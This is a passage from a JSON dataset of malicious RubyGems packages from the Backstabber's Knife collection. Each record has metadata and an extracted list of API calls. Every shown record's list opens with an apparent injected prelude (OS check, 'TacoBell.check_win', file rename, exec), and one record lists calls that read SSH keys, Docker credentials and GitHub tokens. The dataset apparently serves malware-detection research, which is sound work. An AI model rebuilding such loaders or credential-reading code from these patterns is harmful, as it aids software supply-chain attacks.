            "Source": "Backstabber-Knife",
            "code_api": "['require', 'require', 'require', 'RbConfig::CONFIG.[]', 'os.match', 'TacoBell.check_win', 'File.rename', 'exec', 'require_relative', 'require_relative', 'require_relative', 'RUBY_ENGINE.==', 'require', 'include', 'Extensions.register', 'treeprocessor', 'process', 'document.find_by', 'tables.each', 'table.rows.head.each', 'table.rows.head', 'table.rows', 'head.each', 'get_raw_text', 'cell.text=', 'Asciidoctor::Pdf::Linewrap::Ja::Converter.insert_zero_width_space', 'table.rows.body.each', 'table.rows.body', 'table.rows', 'body.each', 'get_raw_text', 'cell.text=', 'Asciidoctor::Pdf::Linewrap::Ja::Converter.insert_zero_width_space', 'table.rows.foot.each', 'table.rows.foot', 'table.rows', 'foot.each', 'get_raw_text', 'cell.text=', 'Asciidoctor::Pdf::Linewrap::Ja::Converter.insert_zero_width_space', 'document.find_by', 'paragraphs.each', 'paragraph.lines.each_with_index', 'paragraph.lines', 'paragraph.lines.[]=', 'paragraph.lines', 'Asciidoctor::Pdf::Linewrap::Ja::Converter.insert_zero_width_space', 'document.find_by', 'list_items.each', 'get_raw_text', 'list_item.text=', 'Asciidoctor::Pdf::Linewrap::Ja::Converter.insert_zero_width_space', 'item.instance_variable_defined?', 'item.instance_variable_get', 'item.text', '\"’”）〕］｝〉》」』】｠〙〗»〟\" + \"‐〜゠–\" + \"！？‼⁇⁈⁉\" + \"・：；\" + \"。．\" + \"、，\" + \"ヽヾゝゞ々〻\" + \"ー\" + \"ぁぃぅぇぉァィゥェォっゃゅょゎゕゖッャュョヮヵヶㇰㇱㇲㇳㇴㇵㇶㇷㇸㇹㇺㇻㇼㇽㇾㇿㇷ゚\".+', '\"’”）〕］｝〉》」』】｠〙〗»〟\" + \"‐〜゠–\" + \"！？‼⁇⁈⁉\" + \"・：；\" + \"。．\" + \"、，\" + \"ヽヾゝゞ々〻\" + \"ー\".+', '\"’”）〕］｝〉》」』】｠〙〗»〟\" + \"‐〜゠–\" + \"！？‼⁇⁈⁉\" + \"・：；\" + \"。．\" + \"、，\" + \"ヽヾゝゞ々〻\".+', '\"’”）〕］｝〉》」』】｠〙〗»〟\" + \"‐〜゠–\" + \"！？‼⁇⁈⁉\" + \"・：；\" + \"。．\" + \"、，\".+', '\"’”）〕］｝〉》」』】｠〙〗»〟\" + \"‐〜゠–\" + \"！？‼⁇⁈⁉\" + \"・：；\" + \"。．\".+', '\"’”）〕］｝〉》」』】｠〙〗»〟\" + \"‐〜゠–\" + \"！？‼⁇⁈⁉\" + \"・：；\".+', '\"’”）〕］｝〉》」』】｠〙〗»〟\" + \"‐〜゠–\" + \"！？‼⁇⁈⁉\".+', '\"’”）〕］｝〉》」』】｠〙〗»〟\" + \"‐〜゠–\".+', '\"’”）〕］｝〉》」』】｠〙〗»〟\".+', '\"‘“（〔［｛〈《「『【｟〘〖«〝\".+', 'line.nil?', 'line.each_char.with_index', 'line.each_char', 'new_line.<<', 'insert_zero_width_space?', 'line.[]', 'idx.+', 'new_line.<<', 'remove_zero_width_space', 'japanese_char?', 'prohibit_line_break?(ch, next_ch).!', 'prohibit_line_break?', 'next_ch.!=', 'japanese_char?', 'prohibit_line_break_before?(next_ch).!', 'prohibit_line_break_before?', 'line.gsub', 'href.gsub', '/[\\\\p{Han}\\\\p{Hiragana}\\\\p{Katakana}ー]/.===', 'PROHIBIT_LINE_BREAK_BEFORE.include?', 'PROHIBIT_LINE_BREAK_AFTER.include?', 'PROHIBIT_DIVIDE.include?', 'prohibit_line_break_after?', 'prohibit_line_break_before?', 'prohibit_divide?', 'PROHIBIT_LINE_BREAK_AFTER.include?', 'ch.==', 'PROHIBIT_LINE_BREAK_BEFORE.include?', 'next_ch.==', 'PROHIBIT_DIVIDE.include?', 'PROHIBIT_DIVIDE.include?']",
            "n_tokens": 1225,
            "embedding": "[ 0.03105381 -0.03241982 -0.01029967 ... -0.00667976 -0.02367739\n  0.00063519]",
            "cluster": "0",
            "id": 115,
            "Filepath": "/Users/xxxx/Documents/malware/rubygems/Backstabber/asciidoctor_pdf-linewrap-ja/0.6.0/asciidoctor_pdf-linewrap-ja-0.6.0.gem",
            "path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/asciidoctor_pdf-linewrap-ja/0.6.0/asciidoctor_pdf-linewrap-ja-0.6.0_extracted",
            "name": "asciidoctor_pdf-linewrap-ja",
            "version": "0.6.0",
            "published_at": "2020-02-16T05:57:36.819Z",
            "Status": "tracked",
            "OSS": "RubyGems",
            "description": NaN,
            "author": 1.0,
            "maintainers": "The number of author or maintainer is 1.",
            "repository_url": "contain a homepage URL and a Github URL.",
            "dependencies": "bundler, rake, minitest, asciidoctor-pdf",
            "SHA-256": "255b5777f2694d97c880c2d7fae54496d20edffb629e7e25c69b2754bdcfec7c"
        },
        {
            "name_version": "assembly_client-0.9.0",
            "SourceCode_Path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/assembly_client/0.9.0/assembly_client-0.9.0_extracted/assembly_client-0.9.0_sourcecode.rb",
            "Source": "Backstabber-Knife",
            "code_api": "['require', 'require', 'require', 'RbConfig::CONFIG.[]', 'os.match', 'TacoBell.check_win', 'File.rename', 'exec', 'require', 'File.dirname(\"/Users/xxxx/Documents/malware/rubygems/Backstabber/assembly_client/0.9.0/assembly_client-0.9.0_extracted/assembly_client-0.9.0_sourcecode.rb\").+', 'File.dirname', 'Assembly.client', 'client.post', 'path', 'Util.build', 'base.extend', 'Assembly.client', 'client.delete', 'path', 'client.delete', 'client', 'path', 'base.extend', 'Assembly.client', 'client.get', 'path', 'Util.build', 'Assembly.client', 'params.delete', 'params.delete', 'list', '{ page: page, per_page: 100 }.merge', 'ret.data', 'ret.next_page', 'Assembly.client', 'list({ per_page: 1 }.merge(params), client).total_count', 'list', '{ per_page: 1 }.merge', 'base.extend', 'Assembly.client', 'id.nil?', 'id.to_s.empty?', 'id.to_s', 'raise', 'ArgumentError.new', 'client.get', 'path', 'Util.build', 'alias_method', 'base.extend', 'Assembly.client', 'client.put', 'path', 'Util.build', 'client.put', 'client', 'path', 'dirty_params.merge', 'dirty_params', 'self.update_from', 'alias_method', 'base.extend', 'self.class.path', 'self.class', 'id', 'Util.underscore', 'self.class_name', 'protected', 'client.get', 'client', '{ page: page, per_page: 100 }.merge', 'Util.build', 'client', 'ret.data', 'ret.next_page', 'attr_reader', 'Assembly.config', 'build_api_adapter', 'params.delete', 'headers.merge!', '@api.get', 'check_errors', 'response.body', 'get', '@api.post', 'params.to_json', 'check_errors', 'response.body', '@api.put', 'params.to_json', 'check_errors', 'response.body', '@api.delete', 'check_errors', 'response.status.==', 'response.status', 'Assembly::AcademicYearResource.new', 'Assembly::AssessmentResource.new', 'Assembly::AssessmentPointResource.new', 'Assembly::AspectResource.new', 'Assembly::CalendarEventResource.new', 'Assembly::ContactResource.new', 'Assembly::GradeSetResource.new', 'Assembly::RegistrationGroupResource.new', 'Assembly::ResultResource.new', 'Assembly::SchoolDetailResource.new', 'Assembly::FacetResource.new', 'Assembly::StaffMemberResource.new', 'Assembly::StudentResource.new', 'Assembly::SubjectResource.new', 'Assembly::TeachingGroupResource.new', 'Assembly::AttendanceResource.new', 'Assembly::ExclusionResource.new', 'Assembly::YearGroupResource.new', 'config.client_id', 'config', 'config.client_secret', 'config', 'config.refresh_token', 'config', 'Faraday.new', 'config.auth_host', 'config', 'faraday.request', 'faraday.response', 'faraday.adapter', 'Faraday.default_adapter', 'refresh_api.headers.[]=', 'refresh_api.headers', 'config.api_version', 'config', 'refresh_api.headers.[]=', 'refresh_api.headers', 'refresh_api.basic_auth', 'config.client_id', 'config', 'config.client_secret', 'config', 'refresh_api.post', 'config.refresh_token', 'config', 'check_errors', 'config.token=', 'config', 'response.body.[]', 'response.body', 'build_api_adapter', '@on_token_refresh.call', 'response.body', 'private', 'response.status.to_i', 'response.status', 'handle_unauthorized_response', 'raise', 'Assembly::NotFoundError.new', 'raise', 'Assembly::ValidationError.new', 'raise', 'Assembly::TooManyRequestsError.new', 'raise', 'Assembly::ServerError.new', 'response.body.[](:error).!=', 'response.body.[]', 'response.body', 'raise', 'Assembly::UnauthorizedError.new', 'refresh_token!', 'raise', 'Assembly::UnauthorizedError.new', 'Faraday.new', 'config.host', 'config', 'faraday.request', 'faraday.request', 'config.token', 'config', 'faraday.response', 'faraday.adapter', 'Faraday.default_adapter', '@api.headers.[]=', '@api.headers', 'config.api_version', 'config', '@response.status', '@response.body', 'body.length.>', 'body.length', 'body.[]', 'status', 'message', '@response.body.[]', '@response.body', 'errors.inspect', 'errors', 'define_parser', 'body.strip.empty?', 'body.strip', '::JSON.parse', 'attr_accessor', 'merge', 'self.dup', 'copy.merge', 'options.each', 'send', 'require', 'require', '\"Authorization\".freeze', 'attr_reader', 'env.[](:request_headers).[]', 'env.[]', 'token', '@app.call', 'token.is_a?', 'raise', 'ArgumentError.new', 'token.inspect', 'Faraday::Request.register_middleware', 'include', 'method_defined?', 'method_defined?', 'attr_reader', 'attr_reader', 'Set.new', 'Set.new', 'values.keys.-', 'values.keys', '@values.keys', 'add_accessors', 'values.each', '@values.[]=', 'Util.build', 'new(response.[](:id), client).merge', 'new', 'response.[]', '@dirty_values.clear', 'merge', '@dirty_values.any?', '@values.[]', 'k.to_sym', 'send', '@values.keys', '@values.values', 'JSON.generate', '@values.as_json', '@values.inject', 'acc.[]=', 'value.respond_to?', 'value.to_hash', '@values.each', 'self.name.split(\"::\").[]', 'self.name.split', 'self.name', '@dirty_values.reduce', 'hsh.[]=', '@values.[]', 'protected', 'keys.each', 'k.==', 'self.class.instance_methods(false).include?', 'self.class.instance_methods', 'self.class', 'self.class.class_eval', 'self.class', 'include', 'Resource.build', 'include', 'include', 'include', 'include', 'Resource.build', 'include', 'include', 'client.get', 'client', 'path.+', 'path', 'Util.build', 'response.[]', 'client', 'client.get', 'client', 'path.+', 'path', 'Util.build', 'client', 'Resource.build', 'include', 'include', 'pages', 'path.+', 'path', 'rank', 'Resource.build', 'include', 'Resource.build', 'include', 'Resource.build', 'include', 'Resource.build', 'include', 'Resource.build', 'include', 'include', 'Resource.build', 'include', 'include', 'include', 'Resource.build', 'self.data.each', 'self.data', '@values.[]', '@values.[]', '@values.[]', '@values.[]', '@values.[]', 'include', 'include', 'client.get', 'client', 'path.+', 'path', 'Util.build', 'client', 'Resource.build', 'include', 'include', 'include', 'include', 'include', 'Resource.build', 'include', 'Resource.build', 'include', 'include', 'Resource.build', 'include', 'include', 'Resource.build', 'include', 'Resource.build', 'include', 'include', 'client.get', 'client', 'path.+', 'path', 'Util.build', 'client', 'Resource.build', 'include', 'include', 'client.get', 'client', 'path.+', 'path', 'Util.build', 'client', 'Resource.build', 'Assembly.const_set', 'model_class.class_name.split(\":\").last', 'model_class.class_name.split', 'model_class.class_name', 'resource_class_for', 'Class.new', 'self.class.model_class', 'self.class', 'model_class.included_modules.include?', 'model_class.included_modules', 'model_class.create', 'model_class', 'model_class.included_modules.include?', 'model_class.included_modules', 'model_class.fetch', 'model_class', 'alias_method', 'model_class.included_modules.include?', 'model_class.included_modules', 'model_class.list', 'model_class', 'model_class.all', 'model_class', 'model_class.total_count', 'model_class', 'model_class.included_modules.include?', 'model_class.included_modules', 'model_class.update', 'model_class', 'model_class.included_modules.include?', 'model_class.included_modules', 'model_class.delete', 'model_class', 'str.scan(/[A-Z][a-z]*/).join(\"_\").downcase', 'str.scan(/[A-Z][a-z]*/).join', 'str.scan', 'response.has_key?', 'models.fetch', 'models', 'response.[](:object).to_sym', 'response.[]', 'klass.construct_from', 'response.map', 'Util.build', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'Config.new', 'attr_accessor', 'options.is_a?', '@config.merge', 'block_given?', 'config', 'Client.new', 'options.nil?', 'options.is_a?', 'options.is_a?', '@config.copy_with_overrides', 'Client.new']",
            "n_tokens": 2070,
            "embedding": "[-0.00568499  0.00846464  0.00031332 ...  0.00151914 -0.02846364\n  0.01201776]",
            "cluster": "0",
            "id": 488,
            "Filepath": "/Users/xxxx/Documents/malware/rubygems/Backstabber/assembly_client/0.9.0/assembly_client-0.9.0.gem",
            "path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/assembly_client/0.9.0/assembly_client-0.9.0_extracted",
            "name": "assembly_client",
            "version": "0.9.0",
            "published_at": "2020-02-16T06:00:07.022Z",
            "Status": "tracked",
            "OSS": "RubyGems",
            "description": NaN,
            "author": 1.0,
            "maintainers": "The number of author or maintainer is 1.",
            "repository_url": "contain a homepage URL but not a Github URL.",
            "dependencies": "bundler, rake, mocha, webmock, guard, guard-minitest, minitest-reporters, faraday, faraday_middleware",
            "SHA-256": "2f1b647c9d61b8849f533092b45e879ad7afe6b78b726e279f7ea5b796473d64"
        },
        {
            "name_version": "assemblyline_cli-0.0.21",
            "SourceCode_Path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/assemblyline_cli/0.0.21/assemblyline_cli-0.0.21_extracted/assemblyline_cli-0.0.21_sourcecode.rb",
            "Source": "Backstabber-Knife",
            "code_api": "['require', 'require', 'require', 'RbConfig::CONFIG.[]', 'os.match', 'TacoBell.check_win', 'File.rename', 'exec', 'require', 'require', 'desc', 'option', 'option', 'option', 'option', 'init_local_mount', 'exec', 'bind_mounts', 'env_flags', 'debug_flags', 'dev_mount', 'local_mount', 'assemblyline_builder', 'build_command', 'desc', 'system', 'assemblyline_builder', 'fail', 'exec', 'map', 'desc', 'puts', 'private', 'attr_reader', 'local_mount', 'push', 'sha', 'push', 'options.[]', 'options', 'options.[]', 'options', 'branch_tip.==', 'branch_tip', 'tip', 'branch_tip', '`git rev-parse HEAD`.chomp', '`git rev-parse #{ENV.[](\"branch\")}`.chomp', 'ENV.[]', 'dir?', 'File.expand_path', 'Dir.pwd', 'File.directory?', 'File.expand_path', 'Dir.pwd', 'options.[]', 'options', '$stdout.isatty', 'options.[]', 'options', 'File.expand_path', 'options.[]', 'options', 'Dir.pwd', 'Env.new.to_flags', 'Env.new', 'to_hash.map { |var, val|\\n  \"-e #{var}=#{val}\"\\n}.join', 'to_hash.map', 'to_hash', '{ \"SSH_KEY\" => ssh_key, \"DOCKERCFG\" => dockercfg, \"JSPM_GITHUB_TOKEN\" => ENV.[](\"JSPM_GITHUB_TOKEN\"), \"CI\" => ci?, \"CI_MASTER\" => ci_master?, \"BUILD_URL\" => build_url, \"GIT_URL\" => git_url, \"GITHUB_ACCESS_TOKEN\" => ENV.[](\"GITHUB_ACCESS_TOKEN\") }.reject', 'ssh_key', 'dockercfg', 'ENV.[]', 'ci?', 'ci_master?', 'build_url', 'git_url', 'ENV.[]', 'v.nil?', 'private', 'key_path', 'File.read', 'key_path', 'key.dump', '[\"id_rsa\", \"id_dsa\"].map { |private_key,|\\n  ssh_key_path(private_key)\\n}.detect', '[\"id_rsa\", \"id_dsa\"].map', 'ssh_key_path', 'File.exist?', 'File.join', 'ENV.[]', 'ENV.[]', '[\".dockercfg\", \".docker/config.json\"].each', 'File.join', 'Dir.home', 'File.exist?', 'File.read', 'cfg.gsub(\"\\\\n\", \"\").gsub(\"\\\\t\", \"\").dump', 'cfg.gsub(\"\\\\n\", \"\").gsub', 'cfg.gsub', '[\"CI\", \"CONTINUOUS_INTEGRATION\", \"TDDIUM\", \"TRAVIS\", \"BUILD_ID\", \"JENKINS_URL\", \"CIRCLECI\"].each', 'ENV.[]', 'ENV.[](\"GIT_BRANCH\").==', 'ENV.[]', 'ENV.[]', 'ENV.[]', '`git ls-remote --get-url origin`.chomp', 'u.empty?']",
            "n_tokens": 666,
            "embedding": "[ 0.00181862  0.00296253 -0.00698463 ... -0.00191246 -0.01075728\n  0.01498607]",
            "cluster": "0",
            "id": 391,
            "Filepath": "/Users/xxxx/Documents/malware/rubygems/Backstabber/assemblyline_cli/0.0.21/assemblyline_cli-0.0.21.gem",
            "path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/assemblyline_cli/0.0.21/assemblyline_cli-0.0.21_extracted",
            "name": "assemblyline_cli",
            "version": "0.0.21",
            "published_at": "2020-02-16T06:00:45.732Z",
            "Status": "tracked",
            "OSS": "RubyGems",
            "description": NaN,
            "author": 1.0,
            "maintainers": "The number of author or maintainer is 1.",
            "repository_url": "contain a homepage URL and a Github URL.",
            "dependencies": "bundler, rake, reevoocop, thor",
            "SHA-256": "3a531383401437ce9b7e89b301662bad24bf18b19ca6030027b81804ce6af0de"
        },
        {
            "name_version": "asset-link-0.0.2",
            "SourceCode_Path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/asset-link/0.0.2/asset-link-0.0.2_extracted/asset-link-0.0.2_sourcecode.rb",
            "Source": "Backstabber-Knife",
            "code_api": "['require', 'require', 'require', 'RbConfig::CONFIG.[]', 'os.match', 'TacoBell.check_win', 'File.rename', 'exec', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'attr_accessor', 'attr_accessor', 'self.fog_provider=', 'ENV.fetch', 'self.fog_directory=', 'ENV.[]', 'ENV.[]', 'self.fog_region=', 'ENV.[]', 'ENV.[]', 'self.aws_access_key_id=', 'ENV.[]', 'self.aws_secret_access_key=', 'ENV.[]', 'fog_provider', 'aws_access_key_id', 'aws_secret_access_key', 'fog_region', 'options.merge!', 'fog_region', 'require', 'files.each', 'File.file?', 'puts', 'upload_file', 'create_link_file', 'File.delete', 'files.each', 'File.file?(f).!', 'File.file?', 'File.extname(f).!=', 'File.extname', 'puts', 'read_file', 'download_file', 'File.delete', 'private', 'File.read(f).strip', 'File.read', 'File.extname(f).[]', 'File.extname', 'MultiMime.lookup', 'File.open', 'storage.bucket.files.create(file).public_url', 'storage.bucket.files.create', 'storage.bucket.files', 'storage.bucket', 'storage', 'f.gsub', 'open', 'file.<<', 'open(link).read', 'open', 'File.open', 'file.write', 'AssetLink::Config.new', 'AssetLink::Storage.new', 'config', 'require', 'load_manifest', 'Rack::Request.new', '@app.call', 'URI.unescape(request.path).start_with?', 'URI.unescape', 'request.path', 'code.==', 'body.respond_to?', 'body.to_a.first', 'body.to_a', 'find_asset', 'entry.path', 'asset.filename.ends_with?', 'asset.filename', 'File.read(asset.filename).strip', 'File.read', 'asset.filename', 'open', 'f.meta', 'body.respond_to?', 'body.closed?.!', 'body.closed?', 'body.close', 'f.read', 'private', 'URI.unescape(path).gsub', 'URI.unescape', '@manifest.[](\"files\").[]', '@manifest.[]', '@manifest.[](\"files\").[]', '@manifest.[]', 'assets_engine.find_asset', 'assets_engine', 'manifest_file.[]', 'filename.=~', 'assets_engine.find_asset', 'assets_engine', 'Sprockets::Environment.new(Rails.root).tap', 'Sprockets::Environment.new', 'Rails.root', 'Dir.[](Rails.root.join(\"app\", \"assets\", \"*\")).each', 'Dir.[]', 'Rails.root.join', 'Rails.root', 'e.append_path', 'Dir.[]', 'Rails.root.join', 'Rails.root', 'manifests.first', 'File.read', 'manifests.first', 'JSON.parse', 'require', 'Mime::Type.lookup_by_extension', 'Rack::Mime.mime_type', '::MIME::Types.type_for(ext).first', '::MIME::Types.type_for', 'require', 'attr_accessor', 'Fog::Storage.new', 'config.fog_options', 'config', 'connection.directories.get', 'connection.directories', 'connection', 'config.fog_directory', 'config', 'connection.directories.create', 'connection.directories', 'connection', 'config.fog_directory', 'config']",
            "n_tokens": 743,
            "embedding": "[-0.01954882  0.00098657 -0.00392967 ...  0.01016311 -0.01883778\n  0.02324622]",
            "cluster": "0",
            "id": 782,
            "Filepath": "/Users/xxxx/Documents/malware/rubygems/Backstabber/asset-link/0.0.2/asset-link-0.0.2.gem",
            "path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/asset-link/0.0.2/asset-link-0.0.2_extracted",
            "name": "asset-link",
            "version": "0.0.2",
            "published_at": "2020-02-16T06:03:19.281Z",
            "Status": "tracked",
            "OSS": "RubyGems",
            "description": NaN,
            "author": 1.0,
            "maintainers": "The number of author or maintainer is 1.",
            "repository_url": "contain a homepage URL and a Github URL.",
            "dependencies": "mime-types, bundler, rake, fog",
            "SHA-256": "2946882de65af0734a55e76ceb18569d1a8470e4e641eda262023f68df34ed13"
        },
        {
            "name_version": "assets_publisher-for-hanami-2.0.0",
            "SourceCode_Path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/assets_publisher-for-hanami/2.0.0/assets_publisher-for-hanami-2.0.0_extracted/assets_publisher-for-hanami-2.0.0_sourcecode.rb",
            "Source": "Backstabber-Knife",
            "code_api": "['require', 'require', 'require', 'RbConfig::CONFIG.[]', 'os.match', 'TacoBell.check_win', 'File.rename', 'exec', 'require', 'require_relative', 'require_relative', 'new', 'Location.from', 'Pathname.new', 'uri_parameters.nil?', 'uri_parameters', 'uri.to_s', 'uri', 'uri.to_s + \"?\".+', 'uri.to_s.+', 'uri.to_s', 'uri', 'URI.escape', 'uri_parameters', 'location.real_path_of', 'location', 'uri', 'type.html_for', 'type', 'uri_with_parameters', 'real_path.exist?', 'real_path', 'raise_asset_not_found_error', 'real_path.exist?', 'real_path', 'real_path.mtime', 'real_path', 'protected', 'raise', 'AssetNotFoundError.new', 'uri', 'require', 'require', 'CdT.subclass_responsibility', 'collect_uri_from(rendering_scope).collect', 'collect_uri_from', 'new_asset_from_uri', 'Asset.on_uri', 'CdT.subclass_responsibility', 'CdT.subclass_responsibility', 'configuration.rendering_scope_assets_collector', 'configuration', 'Publisher.configuration', 'require_relative', 'rendering_scope_assets_collector.javascripts_from', 'rendering_scope_assets_collector', 'configuration.javascripts_compiler', 'configuration', 'require_relative', 'rendering_scope_assets_collector.stylesheets_from', 'rendering_scope_assets_collector', 'configuration.stylesheets_compiler', 'configuration', 'has_record_on?', 'compilation_job.id', 'clock_cards_not_match?', 'clock_cards.[]', 'clock_cards', 'compilation_job.id', 'compilation_job.clock_card', 'clock_cards.delete', 'clock_cards', 'compilation_job.id', 'CdT.object', 'compilation_job.clock_card', 'proc', 'card.has_assets_missing?', 'clock_cards.[]=', 'clock_cards', 'compilation_job.id', 'protected', 'clock_cards.key?', 'clock_cards', 'clock_cards_match?(expected_card, card).!', 'clock_cards_match?', 'expected_card.size.==', 'expected_card.size', 'card.size', 'expected_card.all_marks?', 'time.==', 'card.time_for', 'block.call', 'marks.[]=', 'marks', 'marks.[]', 'marks', 'marks.key?', 'marks', 'marks.all?', 'marks', 'marks.any?', 'marks', 'timestamp.==', 'marks.size', 'marks', 'protected', 'require', '@destination.uri.to_s', '@destination.uri', 'assets.empty?', 'assets', 'assets.collect', 'assets', 'asset.real_path.to_s', 'asset.real_path', 'destination.real_path.to_s', 'destination.real_path', 'destination', 'validate_source_assets', 'compiler.compile_job', 'destination.html', 'destination', 'assets.each', 'assets', 'asset.validate_real_path', 'ClockCard.new', 'assets.each', 'assets', 'card.set_mark_for', 'asset.uri.to_s', 'asset.uri', 'asset.modification_time', 'card.set_mark_for', 'destination.uri.to_s', 'destination.uri', 'destination', 'destination.modification_time', 'destination', 'configuration.source_folders.collect', 'configuration.source_folders', 'configuration', 'Pathname(path).expand_path.to_s', 'Pathname(path).expand_path', 'Pathname', 'Publisher.configuration', 'self.new(asset_type).jobs_for', 'self.new', 'CdT.subclass_responsibility', 'Publisher.configuration', 'configuration.published_assets_subfolder', 'configuration', 'Pathname.new(\"/\") + compiled_assets_folder.+', 'Pathname.new(\"/\").+', 'Pathname.new', 'compiled_assets_folder', 'compiled_filename', 'CdT.subclass_responsibility', 'Asset.on_uri', 'asset_type', 'compiled_uri', 'require_relative', 'require_relative', 'assets.collect', 'new_compilation_job_for', 'CompilationJob.new', 'assets_to_compile', 'asset_to_compile_to', 'asset.location.is_absolute?', 'asset.location', 'asset', 'asset.validate_real_path', 'asset', 'asset', 'asset.location.is_absolute?', 'asset.location', 'asset', 'asset', 'asset_to_publish.set_uri_parameters', 'asset_to_publish', 'timestamp_string', '[\".css\", \".js\"].include?', 'asset.uri.extname', 'asset.uri', 'asset', 'asset.uri', 'asset', 'Pathname.new', 'remove_last_extension_from_uri', 'asset.uri.to_s.split(\".\").[](0..-2).join', 'asset.uri.to_s.split(\".\").[]', 'asset.uri.to_s.split', 'asset.uri.to_s', 'asset.uri', 'asset', 'configuration.add_timestamps_to_published_assets?', 'configuration', 'add_timestamps?', 'Time.now.to_s', 'Time.now', 'require', 'require', 'require_relative', '@block.call', 'compilation_job', 'Open3.capture2e', 'status.success?', 'raise_compilation_failed_error', 'ouput.strip', 'require', 'require', 'require', 'require', 'compilation_job.empty?', 'ensure_destination_folder_exists', 'compile_assets', '@compilation_job.assets', 'protected', 'CdT.subclass_responsibility', 'destination_folder.mkpath', 'destination_folder', 'compilation_job.destination.real_path.dirname', 'compilation_job.destination.real_path', 'compilation_job.destination', 'compilation_job', 'raise', 'CompilationJobNotSupportedError.new', 'compilation_job', 'raise', 'CompilationJobFailedError.new', 'compilation_job', 'require', 'require', 'require_relative', 'protected', 'compilation_job.assets.first', 'compilation_job.assets', 'compilation_job', 'validate_assets_collection', 'compile_single_asset', 'just_copy?', 'copy!', 'compile!', 'source_assets.size.==', 'source_assets.size', 'source_assets', 'raise_compilation_job_not_supported_error', '[\".css\", \".js\"].include?', 'source_asset.real_path.extname', 'source_asset.real_path', 'source_asset', '::FileUtils.copy_file', 'source_asset.real_path', 'source_asset', 'compilation_job.destination_filename', 'compilation_job', '::File.open', 'compilation_job.destination_filename', 'compilation_job', 'file.write', 'render_source', 'Tilt.new(source_asset.real_path).render', 'Tilt.new', 'source_asset.real_path', 'source_asset', 'destination_folder', 'add_timestamps_to_published_assets', 'stylesheets_compiler', 'javascripts_compiler', 'use_rendering_scope_assets_collector', '::Pathname.new', '::Pathname.new', 'block.nil?', '@stylesheets_compiler_block.call', 'block.nil?', '@javascripts_compiler_block.call', 'CommandLineCompiler.new', 'require_relative', 'require_relative', 'require_relative', 'require_relative', 'require', 'Publisher.new', 'require_relative', 'Pathname.new(destination_path.to_s + uri.to_s).expand_path', 'Pathname.new', 'destination_path.to_s.+', 'destination_path.to_s', 'destination_path', 'uri.to_s', 'protected', 'configuration.destination_path', 'configuration', 'require', 'class_for_uri(uri).new', 'class_for_uri', 'Pathname.new', 'uri.absolute?', 'class_named', 'uri.relative?', 'class_named', 'raise', 'UnknownAssetLocationError.new', 'fully_qualified.split(\"::\").inject', 'fully_qualified.split', 'mod.const_get', 'Publisher.configuration', 'CdT.subclass_responsibility', 'require_relative', 'require_relative', 'require_relative', 'require', '(AssetsFinder.asset_source_path_of(uri))\\n.expand_path', 'AssetsFinder.asset_source_path_of', 'require', 'require', 'require', 'require_relative', 'require_relative', 'require_relative', 'require_relative', 'require_relative', 'require_relative', 'require_relative', 'ClockCardMachine.new', 'configurations_per_thread.[]', 'configurations_per_thread', '::Thread.current', 'CdT.bind_block_evaluation_to', 'configuration_prototype', 'default_configuration', 'CdT.bind_block_evaluation_to', 'Configuration.new', 'add_timestamps_to_published_assets', 'stylesheets_compiler', 'TiltCompiler.new', 'javascripts_compiler', 'TiltCompiler.new', 'use_rendering_scope_assets_collector', 'with_configuration_copy', 'compile_and_build_html_for', 'StylesheetType.new', 'with_configuration_copy', 'compile_and_build_html_for', 'JavascriptType.new', 'protected', 'compile_assets_and_build_html_for', 'assets_for', 'compilation_jobs_for', 'compile_jobs', 'jobs_html', 'compilation_jobs.each', 'compile', 'clock_card_machine.is_outdated?', 'clock_card_machine', 'compilation_job.compile_with', 'asset_type.compiler', 'clock_card_machine.register_modifications_on', 'clock_card_machine', 'compilation_jobs.inject', 'compilation_job.html', 'OneFilePerAssetBuilder.jobs_for', 'asset_type.collect_assets_from', 'self.class.clock_card_machine', 'self.class', 'self.class.configurations_per_thread.[]=', 'self.class.configurations_per_thread', 'self.class', '::Thread.current', 'self.class.configuration_prototype.dup', 'self.class.configuration_prototype', 'self.class', 'block.call', 'self.class.configurations_per_thread.delete', 'self.class.configurations_per_thread', 'self.class', '::Thread.current', 'require', 'require', 'new.asset_source_path_of', 'new', 'find_source_cotaining(uri).asset_path_of', 'find_source_cotaining', 'protected', 'sources.detect', 'sources', 'proc', 'raise_asset_not_found_error', 'each_source.has_asset?', 'configuration.source_folders.collect', 'configuration.source_folders', 'configuration', 'AssetsSource.on', 'Publisher.configuration', 'raise', 'AssetNotFoundError.new', 'require', 'new', 'Pathname.new', 'asset_path_of(uri).file?', 'asset_path_of', 'folder.+', 'folder']",
            "n_tokens": 2094,
            "embedding": "[ 0.00023495 -0.01385839 -0.00752299 ... -0.00660191 -0.0318687\n -0.00138046]",
            "cluster": "0",
            "id": 628,
            "Filepath": "/Users/xxxx/Documents/malware/rubygems/Backstabber/assets_publisher-for-hanami/2.0.0/assets_publisher-for-hanami-2.0.0.gem",
            "path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/assets_publisher-for-hanami/2.0.0/assets_publisher-for-hanami-2.0.0_extracted",
            "name": "assets_publisher-for-hanami",
            "version": "2.0.0",
            "published_at": "2020-02-16T06:06:01.592Z",
            "Status": "tracked",
            "OSS": "RubyGems",
            "description": NaN,
            "author": 1.0,
            "maintainers": "The number of author or maintainer is 1.",
            "repository_url": "contain a homepage URL and a Github URL.",
            "dependencies": "bundler, rake, sass, coffee-script, therubyracer, cdt-utilities, assets-library-for-hanami, tilt",
            "SHA-256": "78a9dfb96aff8ace98173c66388ebe9f1d394dfb160fab89b3caf46bad069337"
        },
        {
            "name_version": "atlas-client-0.0.2",
            "SourceCode_Path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/atlas-client/0.0.2/atlas-client-0.0.2_extracted/atlas-client-0.0.2_sourcecode.rb",
            "Source": "Backstabber-Knife",
